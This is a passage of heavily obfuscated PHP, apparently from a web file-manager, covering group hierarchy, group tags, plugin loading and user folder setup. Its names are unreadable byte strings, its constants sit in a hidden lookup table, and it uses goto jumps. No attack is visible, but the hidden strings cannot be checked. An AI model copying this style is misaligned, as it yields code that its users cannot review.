} protected function isParentOf($‡¯Ò•Çß, $Œ«½Ù»µ) { $ÇåÂ–Ê§ =& $_SERVER[¹Éµ„ºå]; if (!$‡¯Ò•Çß || !$Œ«½Ù»µ || $‡¯Ò•Çß == $Œ«½Ù»µ) { return !1; } $×Íú¸İ = $this->getInfoSimple($‡¯Ò•Çß); $û×ì¡ı = $this->getInfoSimple($Œ«½Ù»µ); $êÈé´ÀÃ = $×Íú¸İ[$ÇåÂ–Ê§[604]] . $‡¯Ò•Çß . $ÇåÂ–Ê§[50]; if (substr($û×ì¡ı[$ÇåÂ–Ê§[604]], 0, strlen($êÈé´ÀÃ)) == $êÈé´ÀÃ) { return !0; } return !1; } public function groupShowRoot($‡‹û®›, $ØË•ÁÒÊ = false) { $˜³šÈ» =& $_SERVER[¹Éµ„ºå]; $ˆ¹·×ñ = $this->getInfo($‡‹û®›); if (!$ˆ¹·×ñ) { return array(); } $½¨¬Ğñ = $this->parentLevelArray($ˆ¹·×ñ[$˜³šÈ»[604]]); $š€¥ö¹ = array($‡‹û®›); if (count($½¨¬Ğñ) == 0) { return $š€¥ö¹; } if ($ØË•ÁÒÊ && count($½¨¬Ğñ) == 1) { return $š€¥ö¹; } if (!$ˆ¹·×ñ[$˜³šÈ»[555]] || !isset($ˆ¹·×ñ[$˜³šÈ»[555]][$˜³šÈ»[2259]]) || $ˆ¹·×ñ[$˜³šÈ»[555]][$˜³šÈ»[2259]] == $˜³šÈ»[935]) { return $this->groupShowRoot($½¨¬Ğñ[count($½¨¬Ğñ) - 1], $ØË•ÁÒÊ); } if ($ˆ¹·×ñ[$˜³šÈ»[555]][$˜³šÈ»[2259]] == $˜³šÈ»[432]) { $ùæĞ°ŞÜ = explode($˜³šÈ»[50], $ˆ¹·×ñ[$˜³šÈ»[555]][$˜³šÈ»[2260]]); if ($ùæĞ°ŞÜ) { $š€¥ö¹ = array_merge($š€¥ö¹, $ùæĞ°ŞÜ); } } return $š€¥ö¹; } protected function resetParentLevel() { $Ğ¬ûÎÇ¸ =& $_SERVER[¹Éµ„ºå]; $Á™“©ú” = $Ğ¬ûÎÇ¸[1484]; $Ú‰ÃÑıÛ = $this->select(); $Ú‰ÃÑıÛ = array_to_keyvalue($Ú‰ÃÑıÛ, $Á™“©ú”); foreach ($Ú‰ÃÑıÛ as $®ûĞ’Àó) { $Ù€”ÑÒß = $®ûĞ’Àó; $Š ºÛˆğ = array(); while ($Ù€”ÑÒß[$Ğ¬ûÎÇ¸[190]] != 0) { $Š ºÛˆğ[] = $Ù€”ÑÒß[$Ğ¬ûÎÇ¸[190]]; $Ù€”ÑÒß = $Ú‰ÃÑıÛ[$Ù€”ÑÒß[$Ğ¬ûÎÇ¸[190]]]; } $Š ºÛˆğ[] = 0; $Š ºÛˆğ = $Ğ¬ûÎÇ¸[50] . implode($Ğ¬ûÎÇ¸[50], array_reverse($Š ºÛˆğ)) . $Ğ¬ûÎÇ¸[50]; $this->setNamePinyin($®ûĞ’Àó[$Á™“©ú”], $®ûĞ’Àó[$Ğ¬ûÎÇ¸[32]]); $this->where(array($Á™“©ú” => $®ûĞ’Àó[$Á™“©ú”]))->save(array($Ğ¬ûÎÇ¸[674] => $Š ºÛˆğ)); } return $Ú‰ÃÑıÛ; } public function groupNameAuto($Ï•ª…ŠÏ, $«’’Å‡Ğ) { $‚¥‹¹¬å =& $_SERVER[¹Éµ„ºå]; $™Éßïæ = $this->where(array($‚¥‹¹¬å[492] => $Ï•ª…ŠÏ))->getField($‚¥‹¹¬å[32], !0); if (!$™Éßïæ || !in_array($«’’Å‡Ğ, $™Éßïæ)) { return $«’’Å‡Ğ; } for ($™¦Ü£Ó´ = 1; $™¦Ü£Ó´ <= count($™Éßïæ) + 1; $™¦Ü£Ó´++) { $œÈÃ„í = $«’’Å‡Ğ . "\50{$™¦Ü£Ó´}\51"; if (!in_array($œÈÃ„í, $™Éßïæ)) { return $œÈÃ„í; } } } public function groupSwitch($Æ½ùîÔ´, $ıÔ‰²Ãæ) { $åıç•„é =& $_SERVER[¹Éµ„ºå]; $ŠÉ•Å¥Õ = array($åıç•„é[1484] => array($åıç•„é[7], array($Æ½ùîÔ´, $ıÔ‰²Ãæ))); $ó«³ãõ = $this->where($ŠÉ•Å¥Õ)->select(); $ó«³ãõ = array_to_keyvalue($ó«³ãõ, $åıç•„é[1484]); $÷ÁÃÛË = _get($ó«³ãõ, $Æ½ùîÔ´); $ÉãÌ€¸« = _get($ó«³ãõ, $ıÔ‰²Ãæ); if (!$÷ÁÃÛË || !$ÉãÌ€¸« || $÷ÁÃÛË[$åıç•„é[190]] == 0) { return !1; } if ($÷ÁÃÛË[$åıç•„é[1484]] == $ÉãÌ€¸«[$åıç•„é[1484]]) { return !1; } if (strpos($ÉãÌ€¸«[$åıç•„é[604]], $÷ÁÃÛË[$åıç•„é[604]] . $÷ÁÃÛË[$åıç•„é[1484]] . $åıç•„é[50]) === 0) { return !1; } $ŠÉ•Å¥Õ = array($åıç•„é[1484] => $Æ½ùîÔ´); $»“¢‘ãÅ = Model($åıç•„é[2265])->where($ŠÉ•Å¥Õ)->select(); if (!$»“¢‘ãÅ) { $»“¢‘ãÅ = array(); } foreach ($»“¢‘ãÅ as $õûëèÍ) { $‘¯È…² = $õûëèÍ[$åıç•„é[1582]]; $ŠÉ•Å¥Õ = array($åıç•„é[1582] => $‘¯È…², $åıç•„é[1484] => $ıÔ‰²Ãæ); $†şŸ–í“ = Model($åıç•„é[2265])->where($ŠÉ•Å¥Õ)->find(); if (!$†şŸ–í“) { $ßó£‚å³ = array($ıÔ‰²Ãæ => $õûëèÍ[$åıç•„é[1630]]); Model($åıç•„é[617])->userGroupAdd($‘¯È…², $ßó£‚å³); } Model($åıç•„é[617])->userGroupRemove($‘¯È…², $Æ½ùîÔ´); } $ŠÉ•Å¥Õ = array($åıç•„é[188] => 2, $åıç•„é[190] => 0, $åıç•„é[500] => 1, $åıç•„é[589] => array($åıç•„é[7], array($Æ½ùîÔ´, $ıÔ‰²Ãæ))); $¿³†Æ‹ = Model($åıç•„é[924])->where($ŠÉ•Å¥Õ)->field($åıç•„é[2279])->select(); $¿³†Æ‹ = array_to_keyvalue($¿³†Æ‹, $åıç•„é[589], $åıç•„é[191]); $ ‰ñæ¯Î = !empty($¿³†Æ‹[$Æ½ùîÔ´]) ? $¿³†Æ‹[$Æ½ùîÔ´] : !1; if ($ ‰ñæ¯Î) { if (!$¿³†Æ‹[$ıÔ‰²Ãæ]) { $¿³†Æ‹[$ıÔ‰²Ãæ] = Model($åıç•„é[924])->groupRootAdd($ıÔ‰²Ãæ); } $Ì˜¿÷í = $¿³†Æ‹[$ıÔ‰²Ãæ]; $ŠÉ•Å¥Õ = array($åıç•„é[190] => $ ‰ñæ¯Î); $¿³†Æ‹ = Model($åıç•„é[924])->where($ŠÉ•Å¥Õ)->field($åıç•„é[2280])->select(); if (!$¿³†Æ‹) { $¿³†Æ‹ = array(); } Model($åıç•„é[924])->moveClearAuth = !1; foreach ($¿³†Æ‹ as $„ŠÎÛ¬Á) { $ÓÂŒ¡—¢ = $„ŠÎÛ¬Á[$åıç•„é[500]] == $åıç•„é[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($åıç•„é[924])->move($„ŠÎÛ¬Á[$åıç•„é[191]], $Ì˜¿÷í, $ÓÂŒ¡—¢); } Model($åıç•„é[924])->moveClearAuth = !0; $ŠÉ•Å¥Õ = array($åıç•„é[188] => 2, $åıç•„é[589] => $Æ½ùîÔ´); $˜¦³¡šñ = array($åıç•„é[589] => $ıÔ‰²Ãæ); Model($åıç•„é[2281])->where($ŠÉ•Å¥Õ)->save($˜¦³¡šñ); Model($åıç•„é[2282])->where($ŠÉ•Å¥Õ)->save($˜¦³¡šñ); } $this->_changeChildLevel($ó«³ãõ[$Æ½ùîÔ´], $ó«³ãõ[$ıÔ‰²Ãæ], !0); $this->where(array($åıç•„é[190] => $Æ½ùîÔ´))->save(array($åıç•„é[190] => $ıÔ‰²Ãæ)); $this->_clearChildrenCache($ó«³ãõ[$ıÔ‰²Ãæ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($Š‹è¶ó) { $Âšâ« =& $_SERVER[¹Éµ„ºå]; return array($Âšâ«[2283] => array($Š‹è¶ó[0], $Âšâ«[2284]), $Âšâ«[2285] => array($Š‹è¶ó[0], $Âšâ«[2286])); } protected function ___get($ğ–“¥š÷) { $ÜÁ‰ÂÎ® =& $_SERVER[¹Éµ„ºå]; $È‹õŸ”‹ = Model($ÜÁ‰ÂÎ®[605])->metaGet($ğ–“¥š÷, $ÜÁ‰ÂÎ®[2287]); $è¾ËØ›“ = json_decode($È‹õŸ”‹, !0); return $è¾ËØ›“ ? $è¾ËØ›“ : array($ÜÁ‰ÂÎ®[2288] => $ÜÁ‰ÂÎ®[91], $ÜÁ‰ÂÎ®[446] => array()); } protected function ___listData($²ôÌå·œ) { $á¾ñõŸì =& $_SERVER[¹Éµ„ºå]; $ì³µçÜ° = array($á¾ñõŸì[1956] => 0, $á¾ñõŸì[573] => array($á¾ñõŸì[2289], 0), $á¾ñõŸì[511] => $á¾ñõŸì[1480] . $²ôÌå·œ); $ËîÊ“² = $á¾ñõŸì[2290]; $ÅÖÇò„Ä = $this->field($ËîÊ“²)->where($ì³µçÜ°)->order($á¾ñõŸì[2291])->select(); return $ÅÖÇò„Ä ? $ÅÖÇò„Ä : array(); } protected function set($íÌ÷§, $éÂèçğ¥) { $÷Î»Ñ´ˆ =& $_SERVER[¹Éµ„ºå]; $éÂèçğ¥ = $éÂèçğ¥ ? $éÂèçğ¥ : array($÷Î»Ñ´ˆ[2288] => $÷Î»Ñ´ˆ[91], $÷Î»Ñ´ˆ[446] => array()); return Model($÷Î»Ñ´ˆ[605])->metaSet($íÌ÷§, $÷Î»Ñ´ˆ[2287], json_encode($éÂèçğ¥)); } protected function getByTagID($’ÕíÜ, $ÙÁç™Ä¢) { $ó‘—”¥Ÿ =& $_SERVER[¹Éµ„ºå]; if (!$’ÕíÜ || !$ÙÁç™Ä¢) { return !1; } if (!Model($ó‘—”¥Ÿ[605])->getInfoSimple($’ÕíÜ)) { return !1; } $¦¢¢šÌÙ = $this->get($’ÕíÜ); if (!$¦¢¢šÌÙ || !isset($¦¢¢šÌÙ[$ó‘—”¥Ÿ[446]])) { return !1; } $®„ËÆ„ = array_find_by_field($¦¢¢šÌÙ[$ó‘—”¥Ÿ[446]], $ó‘—”¥Ÿ[487], $ÙÁç™Ä¢); return is_array($®„ËÆ„) ? $®„ËÆ„ : !1; } public function listSource($ä™–Æ¬Ğ, $ËÌâ«£Ò) { $õ‹¿çí =& $_SERVER[¹Éµ„ºå]; if ($ËÌâ«£Ò && !is_array($ËÌâ«£Ò)) { $ËÌâ«£Ò = array($ËÌâ«£Ò); } $èğÜÆø¼ = $this->get($ä™–Æ¬Ğ); $ıÛçõÑ’ = array_to_keyvalue($èğÜÆø¼[$õ‹¿çí[446]], $õ‹¿çí[487]); $áª¾¬ˆÜ = array_to_keyvalue($èğÜÆø¼[$õ‹¿çí[598]], $õ‹¿çí[487]); $ÆÃĞªù¸ = $this->listData($ä™–Æ¬Ğ); $ğ•ĞŠ›Û = array(); foreach ($ËÌâ«£Ò as $µƒâğ·ä) { $ÉƒÄ»åı = $ıÛçõÑ’[$µƒâğ·ä]; $±‰™Çğ = _get($ÉƒÄ»åı, $õ‹¿çí[598]); if (!$ÉƒÄ»åı || !$±‰™Çğ || !$áª¾¬ˆÜ[$±‰™Çğ]) { continue; } if (!$ğ•ĞŠ›Û[$±‰™Çğ]) { $ğ•ĞŠ›Û[$±‰™Çğ] = array(); } $ğ•ĞŠ›Û[$±‰™Çğ][] = $µƒâğ·ä; } $°”ãìÓ = array(); $ä¦»Â™‡ = array(); foreach ($ÆÃĞªù¸ as $Øô‘£õŠ) { $ßöââ¹® = $Øô‘£õŠ[$õ‹¿çí[87]]; $ÉƒÄ»åı = $ıÛçõÑ’[$Øô‘£õŠ[$õ‹¿çí[515]]]; $±‰™Çğ = _get($ÉƒÄ»åı, $õ‹¿çí[598]); if (!$ÉƒÄ»åı || !$±‰™Çğ || !$ğ•ĞŠ›Û[$±‰™Çğ] || !$ßöââ¹®) { continue; } if (!in_array($Øô‘£õŠ[$õ‹¿çí[515]], $ğ•ĞŠ›Û[$±‰™Çğ])) { continue; } if (!$°”ãìÓ[$ßöââ¹®]) { $°”ãìÓ[$ßöââ¹®] = array(); } $°”ãìÓ[$ßöââ¹®][] = $±‰™Çğ; } foreach ($°”ãìÓ as $ßöââ¹® => $€‹¹Ó€) { if (count($€‹¹Ó€) != count($ğ•ĞŠ›Û)) { continue; } $ä¦»Â™‡[] = $ßöââ¹®; } if (!$ËÌâ«£Ò) { $ä¦»Â™‡ = array_to_keyvalue($ÆÃĞªù¸, $õ‹¿çí[12], $õ‹¿çí[87]); } $ä¦»Â™‡ = array_unique($ä¦»Â™‡); if (!$ä¦»Â™‡) { return array(); } $´·ŸÊë = array($õ‹¿çí[506] => array($õ‹¿çí[507], $ä¦»Â™‡), $õ‹¿çí[589] => $ä™–Æ¬Ğ, $õ‹¿çí[188] => SourceModel::TYPE_GROUP); $¦ş¡Ş¬ = Model($õ‹¿çí[1523])->listSource($´·ŸÊë); if (!$¦ş¡Ş¬ || count($ä¦»Â™‡) == $¦ş¡Ş¬[$õ‹¿çí[443]][$õ‹¿çí[444]]) { return $¦ş¡Ş¬; } $ªëøˆŞê = array(); $­Èå¡¢— = array_to_keyvalue($¦ş¡Ş¬[$õ‹¿çí[85]], $õ‹¿çí[12], $õ‹¿çí[191]); $ Ï›º¼ = array_to_keyvalue($¦ş¡Ş¬[$õ‹¿çí[86]], $õ‹¿çí[12], $õ‹¿çí[191]); $ıÊ”¿†× = array_merge($ Ï›º¼, $­Èå¡¢—); foreach ($ä¦»Â™‡ as $ßöââ¹®) { if (!in_array($ßöââ¹®, $ıÊ”¿†×)) { $ªëøˆŞê[] = $ßöââ¹®; } } if ($ªëøˆŞê) { $this->removeBySource($ä™–Æ¬Ğ, $ªëøˆŞê); } return $¦ş¡Ş¬; } protected function addToTag($ÇØäıü, $“†íöÏ†, $ƒÒ©ÍÀó) { $…ÎïœÀ =& $_SERVER[¹Éµ„ºå]; if (!$this->getByTagID($ÇØäıü, $ƒÒ©ÍÀó) || !$“†íöÏ†) { return !1; } if (!Model($…ÎïœÀ[924])->pathInfo($“†íöÏ†)) { return !1; } $¾ÍÍÙÃ = array($…ÎïœÀ[1956] => 0, $…ÎïœÀ[573] => $ƒÒ©ÍÀó, $…ÎïœÀ[510] => $“†íöÏ†, $…ÎïœÀ[511] => $…ÎïœÀ[2292] . $ÇØäıü, $…ÎïœÀ[509] => $…ÎïœÀ[12], $…ÎïœÀ[2175] => 0); if ($this->where($¾ÍÍÙÃ)->find()) { return !1; } return $this->add($¾ÍÍÙÃ); } protected function removeFromTag($ÛÙá´ÛÀ, $ô¿¬åëÊ, $å—ÊÂ–ª) { $µ´ÆÏ€Ü =& $_SERVER[¹Éµ„ºå]; if (!$this->getByTagID($ÛÙá´ÛÀ, $å—ÊÂ–ª) || !$ô¿¬åëÊ) { return !1; } if (is_array($ô¿¬åëÊ)) { $ô¿¬åëÊ = array($µ´ÆÏ€Ü[7], $ô¿¬åëÊ); } $­Á˜Â ´ = array($µ´ÆÏ€Ü[1956] => 0, $µ´ÆÏ€Ü[573] => $å—ÊÂ–ª, $µ´ÆÏ€Ü[511] => $µ´ÆÏ€Ü[2292] . $ÛÙá´ÛÀ, $µ´ÆÏ€Ü[510] => $ô¿¬åëÊ); return $this->where($­Á˜Â ´)->delete(); } protected function removeByTag($´Ù¦¿Ò”, $û¸ù’œ¢) { $­†ŠêÂ™ =& $_SERVER[¹Éµ„ºå]; if (!$this->getByTagID($´Ù¦¿Ò”, $û¸ù’œ¢)) { return !1; } $¡É“ã»€ = array($­†ŠêÂ™[1956] => 0, $­†ŠêÂ™[573] => $û¸ù’œ¢, $­†ŠêÂ™[511] => $­†ŠêÂ™[2292] . $´Ù¦¿Ò”); return $this->where($¡É“ã»€)->delete(); } protected function removeBySource($ä´•ò‚, $æ¨Û¥ğå) { $İÀİœ·Š =& $_SERVER[¹Éµ„ºå]; if (!$ä´•ò‚ || !$æ¨Û¥ğå) { return !1; } if (is_array($æ¨Û¥ğå)) { $æ¨Û¥ğå = array($İÀİœ·Š[7], $æ¨Û¥ğå); } $¡èâ…ú = array($İÀİœ·Š[1956] => 0, $İÀİœ·Š[510] => $æ¨Û¥ğå, $İÀİœ·Š[573] => array($İÀİœ·Š[1171], 0), $İÀİœ·Š[511] => $İÀİœ·Š[2292] . $ä´•ò‚); return $this->where($¡èâ…ú)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x70\154\165\147\x69\x6e\114\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\163\164\141\164\x75\163", "\x72\145\x67\151\x65\x73\x74", "\x63\157\x6e\146\151\x67"); public function loadList($ªİ°ä³ = false) { $É¡ä‚¡ö = array_to_keyvalue($this->listData(), $_SERVER[¹Éµ„ºå][32]); if ($ªİ°ä³) { return $É¡ä‚¡ö[$ªİ°ä³]; } return $É¡ä‚¡ö; } public function init() { $ˆŒ‘±• =& $_SERVER[¹Éµ„ºå]; Hook::trigger($ˆŒ‘±•[2293]); $ŠÖ¾¯á  = $this->loadPluginList(); foreach ($ŠÖ¾¯á  as $ÂÖîš×â => $Ãæ°½İ) { $§´¢¸Ó = $this->appAllow($ÂÖîš×â, $Ãæ°½İ); if (!$§´¢¸Ó) { continue; } foreach ($Ãæ°½İ[$ˆŒ‘±•[2294]] as $ˆãÆ…¿Ö => $›…Ìë­²) { Hook::bind($ˆãÆ…¿Ö, $›…Ìë­²); } } Hook::trigger($ˆŒ‘±•[2295]); Hook::trigger(ACTION); } public function appAllow($óÛÅ–ş¿, $‹÷œÔôÃ, $¥ôÜ–¾Õ = true) { $ÌÉ°º¨· =& $_SERVER[¹Éµ„ºå]; $¸ñÇ·Ö = PLUGIN_DIR . $óÛÅ–ş¿ . $ÌÉ°º¨·[2296]; if (!is_array($‹÷œÔôÃ) || !is_array($‹÷œÔôÃ[$ÌÉ°º¨·[2294]]) || $‹÷œÔôÃ[$ÌÉ°º¨·[841]] != 1 || !is_file($¸ñÇ·Ö)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ÌÉ°º¨·[6]][$ÌÉ°º¨·[2297]] || !$GLOBALS[$ÌÉ°º¨·[6]][$ÌÉ°º¨·[2298]]) { return !0; } $İ·Õ”ºÕ = explode($ÌÉ°º¨·[50], strtolower($GLOBALS[$ÌÉ°º¨·[6]][$ÌÉ°º¨·[2298]])); return in_array(strtolower($óÛÅ–ş¿), $İ·Õ”ºÕ) ? !1 : !0; } if ($¥ôÜ–¾Õ && !Action($ÌÉ°º¨·[2299])->checkAuth($óÛÅ–ş¿)) { return !1; } return !0; } public function unInstall($úşÈ—Å‘) { $óàÕÍİ =& $_SERVER[¹Éµ„ºå]; $ŠÏÕôœ  = $this->loadList($úşÈ—Å‘); if (file_exists(PLUGIN_DIR . $úşÈ—Å‘)) { Hook::apply($úşÈ—Å‘ . $óàÕÍİ[2300]); } $this->remove($ŠÏÕôœ [$óàÕÍİ[487]]); } public function changeStatus($É—­Û¤‡, $Ì¡ú½·‚) { $øÒ¢´¾Â =& $_SERVER[¹Éµ„ºå]; $„Ê—¿ ¯ = $this->loadList($É—­Û¤‡); if ($Ì¡ú½·‚) { Hook::apply($É—­Û¤‡ . $øÒ¢´¾Â[2301]); } $this->update($„Ê—¿ ¯[$øÒ¢´¾Â[487]], array($øÒ¢´¾Â[2302] => $Ì¡ú½·‚)); } public function appRegist($ûëÔòÄÂ, $Ş–™œÍ«) { $ù±âı€ =& $_SERVER[¹Éµ„ºå]; $î‰¶È„  = $this->loadList($ûëÔòÄÂ); if ($î‰¶È„ ) { $this->update($î‰¶È„ [$ù±âı€[487]], array($ù±âı€[2294] => $Ş–™œÍ«)); } else { $Êøå’•¡ = array($ù±âı€[32] => $ûëÔòÄÂ, $ù±âı€[2294] => $Ş–™œÍ«, $ù±âı€[841] => 0, $ù±âı€[6] => $this->getConfigDefault($ûëÔòÄÂ)); $this->insert($Êøå’•¡); } } public function getConfigDefault($ŒÃÅøŠã) { $÷¢¨¤¦… =& $_SERVER[¹Éµ„ºå]; $¢”ÑéÚŞ = array(); $¹¡ƒáÏ… = $this->getPackageJson($ŒÃÅøŠã); if (!$¹¡ƒáÏ… && is_array($¹¡ƒáÏ…[$÷¢¨¤¦…[2303]])) { return $¢”ÑéÚŞ; } foreach ($¹¡ƒáÏ…[$÷¢¨¤¦…[2303]] as $‘Öö­¡– => $Ä£ˆ™…º) { if (!isset($Ä£ˆ™…º[$÷¢¨¤¦…[451]]) || isset($¢”ÑéÚŞ[$‘Öö­¡–])) { continue; } $¢”ÑéÚŞ[$‘Öö­¡–] = $Ä£ˆ™…º[$÷¢¨¤¦…[451]]; } return $¢”ÑéÚŞ; } public function getPackageJson($©ı°ë ¢) { return Hook::apply($©ı°ë ¢ . $_SERVER[¹Éµ„ºå][2304]); } public function getConfig($µ‹ßÃ Ô, $Ğœ´ê·Ù = false) { $‡÷•¢äå =& $_SERVER[¹Éµ„ºå]; $¿†Î ¥ = array(); $«¿°ÖÕè = $this->loadList($µ‹ßÃ Ô); if ($«¿°ÖÕè && is_array($«¿°ÖÕè[$‡÷•¢äå[6]])) { $¿†Î ¥ = $«¿°ÖÕè[$‡÷•¢äå[6]]; } if (!$¿†Î ¥ || $Ğœ´ê·Ù) { $¿†Î ¥ = $this->getConfigDefault($µ‹ßÃ Ô); } return $¿†Î ¥; } public function setConfig($…Ñ²Ÿù, $ëå‘ğ¸Õ = false) { $ÄãÓ¾Ä¿ =& $_SERVER[¹Éµ„ºå]; $Şª‰Œ‚ = $this->loadList($…Ñ²Ÿù); if (!$Şª‰Œ‚) { return !1; } $ã¯´Æ¬˜ = $Şª‰Œ‚[$ÄãÓ¾Ä¿[6]]; if ($ëå‘ğ¸Õ == !1) { $ã¯´Æ¬˜ = array(); $ëå‘ğ¸Õ = $this->getConfigDefault($…Ñ²Ÿù); } foreach ($ëå‘ğ¸Õ as $ğÛøû‡ => $âÖÎÒ«î) { $ã¯´Æ¬˜[$ğÛøû‡] = is_string($âÖÎÒ«î) ? trim($âÖÎÒ«î) : $âÖÎÒ«î; } $this->update($Şª‰Œ‚[$ÄãÓ¾Ä¿[487]], array($ÄãÓ¾Ä¿[6] => $ã¯´Æ¬˜)); } public function viewList() { $€›Å€ıá =& $_SERVER[¹Éµ„ºå]; $åü™¤¿Ë = $this->loadList(); $this->pluginScan($åü™¤¿Ë); $åü™¤¿Ë = $this->loadPluginList(); $Æá¿€®¦ = array(); foreach ($åü™¤¿Ë as $íŞãêó => $Á‰§Äñ) { $ã‹–…à = $Á‰§Äñ; unset($Á‰§Äñ[$€›Å€ıá[2294]], $Á‰§Äñ[$€›Å€ıá[6]]); $ÅçŠÌ›Ş = PLUGIN_DIR . $Á‰§Äñ[$€›Å€ıá[32]] . $€›Å€ıá[2296]; if (!is_file($ÅçŠÌ›Ş)) { continue; } $òÆÜËÍ½ = Hook::apply($Á‰§Äñ[$€›Å€ıá[32]] . $€›Å€ıá[2304]); if (!is_array($òÆÜËÍ½)) { continue; } $Æá¿€®¦[$íŞãêó] = array_merge($Á‰§Äñ, $òÆÜËÍ½); if ($ã‹–…à[$€›Å€ıá[6]][$€›Å€ıá[1879]] != $òÆÜËÍ½[$€›Å€ıá[1853]]) { Hook::apply($Á‰§Äñ[$€›Å€ıá[32]] . $€›Å€ıá[2301]); $ã‹–…à[$€›Å€ıá[6]][$€›Å€ıá[1879]] = $òÆÜËÍ½[$€›Å€ıá[1853]]; $this->update($Á‰§Äñ[$€›Å€ıá[487]], array($€›Å€ıá[6] => $ã‹–…à[$€›Å€ıá[6]])); } } return $Æá¿€®¦; } private function loadPluginList() { $“€¸çÙò =& $_SERVER[¹Éµ„ºå]; $¡¤µèâ« = $this->loadList(); if (strtolower(MOD) == $“€¸çÙò[2305]) { return $¡¤µèâ«; } $“­æÖ™ˆ = Hook::trigger($“€¸çÙò[2306], $¡¤µèâ«); if ($¡¤µèâ« && !$“­æÖ™ˆ) { die; } return $“­æÖ™ˆ ? $“­æÖ™ˆ : $¡¤µèâ«; } private function pluginScan($’¯Ñ’Äñ) { $™¥’¤µê =& $_SERVER[¹Éµ„ºå]; recursion_dir(PLUGIN_DIR, $‘ÅÛòÔÄ, $³ÏÆ÷å, 0); foreach ($‘ÅÛòÔÄ as $Ç¦ª÷œ±) { $Ñ›«œ¼ = get_path_this($Ç¦ª÷œ±); if (isset($’¯Ñ’Äñ[$Ñ›«œ¼]) || !file_exists($Ç¦ª÷œ± . $™¥’¤µê[2307]) || !file_exists($Ç¦ª÷œ± . $™¥’¤µê[2296])) { continue; } Hook::apply($Ñ›«œ¼ . $™¥’¤µê[2301]); } } } goto Dè’æÜŠô; DõÒìœíœ˜: function binCheckBigger($äîÆûú, $À–¨Â¾) { return $äîÆûú > $À–¨Â¾; } $_SERVER[$_SERVER[ÃÂ¤•­ú][3]] = (base64_decode('OTIzNw==')."\62\70")+0;$_ngz1="5ar416wzqedijfvy92hkmtbxs3o7u0pgcln8tz138bcs0iwyfuxjkdqemho7gp5v4692lar";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($„³µÇÎ, $Ÿ·êëü—) { $™¨Ù¦ ¢ =& $_SERVER[¹Éµ„ºå]; if (isset(self::$_methodList[$„³µÇÎ])) { return @call_user_func_array(self::$_methodList[$„³µÇÎ], $Ÿ·êëü—); } else { if (method_exists($this, $„³µÇÎ)) { return call_user_func_array(array($this, $„³µÇÎ), $Ÿ·êëü—); } else { think_exception(__CLASS__ . $™¨Ù¦ ¢[4] . $„³µÇÎ . $™¨Ù¦ ¢[5]); } } } public static function __callStatic($Î›ò· İ, $—ªÛ£üñ) { if (isset(self::$_methodListStatic[$Î›ò· İ])) { return call_user_func_array(self::$_methodListStatic[$Î›ò· İ], $—ªÛ£üñ); } else { if (method_exists(self, $Î›ò· İ)) { return call_user_func_array(array(self, $Î›ò· İ), $—ªÛ£üñ); } else { show_json("{$Î›ò· İ}\50\x29\40\x6e\x6f\164\40\x65\170\x69\x73\164\x3b", !1); } } } public static function addMethod($÷Ì‡ı©Á, $”êÍ—ıš) { self::$_methodList[$÷Ì‡ı©Á] = $”êÍ—ıš; } public static function addMethodStatic($ÜòˆüüÜ, $ˆîï†¼Ô) { self::$_methodListStatic[$ÜòˆüüÜ] = $ˆîï†¼Ô; } } goto AË©É‚ì÷; f®……à÷œì: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($æé±ÕÜ“) { $øœŸÕ‘è =& $_SERVER[¹Éµ„ºå]; $ç©å°œ¸ = Model($øœŸÕ‘è[597])->where(array($øœŸÕ‘è[1956] => $æé±ÕÜ“))->find(); $“ÀƒäŒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $æé±ÕÜ“, $ç©å°œ¸[$øœŸÕ‘è[32]]); $this->userDesktopAdd($“ÀƒäŒ); return $“ÀƒäŒ; } public function userDesktopAdd($¬Åô†âî) { $¥·„ïâ =& $_SERVER[¹Éµ„ºå]; $¢ÛîêíÇ = LNG($¥·„ïâ[2452]); $™äª‘À˜ = $this->mkdir($¬Åô†âî, $¢ÛîêíÇ); $this->metaSet($™äª‘À˜, $¥·„ïâ[2453], $¥·„ïâ[91]); $this->metaSet($¬Åô†âî, $¥·„ïâ[2454], $™äª‘À˜); } public function userPathSafeAdd($–Ééá¼) { $Â¨Õ•™³ =& $_SERVER[¹Éµ„ºå]; $Çø°±‰ˆ = Model($Â¨Õ•™³[597])->getInfoFull($–Ééá¼); if (!$Çø°±‰ˆ) { return !1; } if (_get($Çø°±‰ˆ, $Â¨Õ•™³[618])) { return $Çø°±‰ˆ[$Â¨Õ•™³[555]][$Â¨Õ•™³[2455]]; } $ìÃ‘ş»³ = $this->_mkdirRoot(SourceModel::TYPE_USER, $–Ééá¼, $Â¨Õ•™³[2456], $Â¨Õ•™³[2457]); Model($Â¨Õ•™³[597])->metaSet($–Ééá¼, $Â¨Õ•™³[2455], $ìÃ‘ş»³); $this->metaSet($ìÃ‘ş»³, $Â¨Õ•™³[2458], $–Ééá¼); return $ìÃ‘ş»³; } public function userPathAppAdd($¨¼õÆÑ, $Ï‰°£¬î = '', $Ãè“¸–Ù = '') { $‡Ø¤÷‚ =& $_SERVER[¹Éµ„ºå]; $‡Îàß’´ = Model($‡Ø¤÷‚[597])->getInfoFull($¨¼õÆÑ); if (!$‡Îàß’´) { return !1; } $½ƒí¿ã‰ = $‡Îàß’´[$‡Ø¤÷‚[555]] ? $‡Îàß’´[$‡Ø¤÷‚[555]] : array(); $°­¼ = $½ƒí¿ã‰[$‡Ø¤÷‚[2459]]; if (!$°­¼) { $°­¼ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¨¼õÆÑ, $‡Ø¤÷‚[2460], $‡Ø¤÷‚[2461]); Model($‡Ø¤÷‚[597])->metaSet($¨¼õÆÑ, $‡Ø¤÷‚[2459], $°­¼ . $‡Ø¤÷‚[12]); $this->metaSet($°­¼, $‡Ø¤÷‚[2459], $¨¼õÆÑ); } if (!$Ï‰°£¬î) { return $°­¼; } $óö³ÅŠŞ = $½ƒí¿ã‰[$‡Ø¤÷‚[2462] . $Ï‰°£¬î]; if (!$óö³ÅŠŞ) { $óö³ÅŠŞ = $this->mkdir($°­¼, $Ï‰°£¬î); 